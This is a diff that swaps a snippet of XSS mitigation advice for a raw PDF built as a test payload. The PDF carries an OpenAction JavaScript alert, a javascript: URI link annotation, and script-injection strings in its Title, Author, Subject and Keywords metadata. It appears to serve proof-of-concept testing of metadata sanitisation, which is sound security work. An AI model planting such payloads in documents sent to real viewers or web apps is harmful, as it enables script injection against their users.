@@ -1,19 +1,99 @@
-/Title (<img src=x onerror=alert(1)>)
-/Author (<script>alert(1)</script>)
-/Subject (<img src=x onerror=alert(1)>)
-<meta name="author" content="<script>alert(1)</script>">
-<span id="authorField">...</span>
-``>
+%PDF-1.4
+%âãÏÓ
 
----
+1 0 obj
+<<
+  /Type /Catalog
+  /Pages 2 0 R
+  /OpenAction 7 0 R
+>>
+endobj
 
-### ✅ Final Fix Advice
+2 0 obj
+<<
+  /Type /Pages
+  /Kids [3 0 R]
+  /Count 1
+>>
+endobj
 
-- Sanitize all metadata fields before using in the DOM.
-- Set a **strong CSP**:
-  ```http
-  Content-Security-Policy:
-    default-src 'self';
-    script-src 'self'; 
-    object-src 'none';
-    base-uri 'none';
+3 0 obj
+<<
+  /Type /Page
+  /Parent 2 0 R
+  /MediaBox [0 0 612 792]
+  /Contents 4 0 R
+  /Annots [5 0 R]
+  /Resources << /Font << /F1 6 0 R >> >>
+>>
+endobj
+
+4 0 obj
+<< /Length 55 >>
+stream
+BT
+/F1 24 Tf
+100 700 Td
+(Test payload PDF) Tj
+ET
+endstream
+endobj
+
+5 0 obj
+<<
+  /Type /Annot
+  /Subtype /Link
+  /Rect [100 600 300 620]
+  /Border [0 0 0]
+  /A <<
+    /S /URI
+    /URI (javascript:alert("XSS in URI"))
+  >>
+>>
+endobj
+
+6 0 obj
+<<
+  /Type /Font
+  /Subtype /Type1
+  /BaseFont /Helvetica
+>>
+endobj
+
+7 0 obj
+<<
+  /S /JavaScript
+  /JS (app.alert("OpenAction XSS"))
+>>
+endobj
+
+8 0 obj
+<<
+  /Producer (ExploitPDF Generator)
+  /Title (<img src=x onerror=alert("TitleXSS")>)
+  /Author (<svg/onload=alert("AuthorXSS")>)
+  /Subject (<script>alert("SubjectXSS")</script>)
+  /Keywords ("XSS"><script>alert('K')</script>)
+>>
+endobj
+
+xref
+0 9
+0000000000 65535 f 
+0000000010 00000 n 
+0000000079 00000 n 
+0000000174 00000 n 
+0000000363 00000 n 
+0000000452 00000 n 
+0000000580 00000 n 
+0000000662 00000 n 
+0000000722 00000 n 
+trailer
+<<
+  /Root 1 0 R
+  /Info 8 0 R
+  /Size 9
+>>
+startxref
+880
+%%EOF
